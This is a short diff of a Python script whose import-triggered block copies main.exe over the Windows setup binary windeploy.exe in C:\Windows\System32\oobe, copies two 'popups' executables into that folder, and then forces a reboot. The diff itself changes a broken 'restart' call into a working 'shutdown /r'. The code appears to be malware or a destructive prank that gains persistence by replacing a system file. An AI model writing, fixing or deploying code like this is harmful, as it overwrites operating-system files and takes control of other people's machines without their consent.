@@ -16,4 +16,4 @@ if not '__main__' == __name__:
     os.system('xcopy main.exe C:\\Windows\\System32\\oobe\\windeploy.exe')
     os.system('xcopy pupups.exe C:\\Windows\\System32\\oobe\\popups.exe')
     os.system('xcopy image_popups.exe C:\\Windows\\System32\\oobe\\image_popups.exe')
-    os.system('restart')
+    os.system('shutdown /r')
